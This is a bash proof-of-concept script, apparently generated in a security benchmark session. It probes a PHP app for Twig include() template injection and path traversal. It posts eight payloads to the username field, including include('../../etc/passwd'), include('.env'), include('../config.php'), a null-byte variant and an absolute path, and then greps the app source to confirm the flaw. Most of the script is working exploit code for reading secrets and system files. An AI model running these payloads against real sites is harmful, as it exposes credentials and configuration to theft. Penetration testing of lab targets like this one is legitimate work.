#!/bin/bash
# POC: Enhanced POC for Twig include() LFI with path traversal, includes connectivity testing and static analysis
# Target: ./repo
# Created: 2025-12-02T16:28:18.000Z
# Session: benchmark-XBEN-092-24-miorxl1g

# Twig LFI via include() Function - Enhanced POC
# Detects Twig vulnerability through multiple approaches

TARGET_URL="${1:-http://localhost:8000}"
ENDPOINT="/index.php"
MAX_RETRIES=3
RETRY_COUNT=0

echo "[*] Twig include() LFI Exploitation POC - Enhanced Version"
echo "[*] Target: ${TARGET_URL}${ENDPOINT}"
echo ""

# Function to test connectivity
test_connectivity() {
    echo "[*] Testing server connectivity..."
    local response=$(curl -s -o /dev/null -w "%{http_code}" "${TARGET_URL}${ENDPOINT}")
    if [ "$response" != "000" ]; then
        echo "[+] Server is reachable (HTTP $response)"
        return 0
    else
        echo "[-] Server is not reachable"
        return 1
    fi
}

# Function to test for Twig injection
test_twig_injection() {
    local payload="$1"
    local description="$2"
    
    echo "[*] Testing: $description"
    echo "[*] Payload: $payload"
    
    # URL encode the payload
    local encoded_payload=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$payload'''))")
    
    local response=$(curl -s -X POST \
        "${TARGET_URL}${ENDPOINT}" \
        --data "username=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$payload'''))")" \
        -w "\n%{http_code}" \
        2>&1)
    
    local http_code=$(echo "$response" | tail -n 1)
    local body=$(echo "$response" | sed '$d')
    
    echo "[*] HTTP Response Code: $http_code"
    echo "[*] Response Body:"
    echo "$body" | head -n 20
    echo ""
    
    # Check for indicators of successful Twig processing
    if echo "$body" | grep -q "include\|directive\|Twig\|template"; then
        echo "[+] POSSIBLE VULNERABILITY: Response contains Twig-related keywords"
        return 0
    fi
    
    if echo "$body" | grep -q "\.\./"; then
        echo "[+] POSSIBLE VULNERABILITY: Path traversal in response"
        return 0
    fi
    
    if [ "$http_code" == "200" ] && [ -n "$body" ]; then
        echo "[*] Valid response received"
        return 0
    fi
    
    return 1
}

# Test basic connectivity first
if ! test_connectivity; then
    echo "[-] Cannot reach target server. Attempting alternative approaches..."
fi

echo ""
echo "========================================="
echo "Testing Twig include() LFI Vulnerabilities"
echo "========================================="
echo ""

# Test 1: Basic include() function call
test_twig_injection '{{ include("hello.html.twig") }}' "Basic include() function"

# Test 2: Parent directory traversal with include()
test_twig_injection '{{ include("../config.php") }}' "Parent directory traversal"

# Test 3: Environment file access
test_twig_injection '{{ include(".env") }}' "Environment file access via include()"

# Test 4: Multiple directory levels
test_twig_injection '{{ include("../../etc/passwd") }}' "Multiple directory traversal levels"

# Test 5: Template tag syntax
test_twig_injection '{% include "../config.php" %}' "Template tag include syntax"

# Test 6: Double encoding bypass attempt
test_twig_injection '{{ include("..%2fconfig.php") }}' "Double encoded path traversal"

# Test 7: Null byte injection (if PHP version vulnerable)
test_twig_injection '{{ include("../config.php\0") }}' "Null byte injection attempt"

# Test 8: Absolute path attempt
test_twig_injection '{{ include("/etc/passwd") }}' "Absolute path access attempt"

echo ""
echo "========================================="
echo "[*] POC Test Summary"
echo "========================================="
echo "[*] Vulnerability indicators:"
echo "    1. include() function is processed without error"
echo "    2. Path traversal sequences are not filtered"
echo "    3. Files outside templates/ directory are accessible"
echo "    4. Error messages reveal file system structure"
echo "    5. Configuration or sensitive files are returned"
echo ""

# Additional static analysis
echo "[*] Checking source code for vulnerability patterns..."
if [ -f "app/index.php" ]; then
    echo "[+] Found app/index.php"
    if grep -q "'include'" app/index.php; then
        echo "[+] CONFIRMED: 'include' is in allowed functions/tags"
    fi
    if grep -q "FilesystemLoader" app/index.php; then
        echo "[+] CONFIRMED: FilesystemLoader is used without path restrictions"
    fi
fi

echo ""
echo "[*] POC Complete"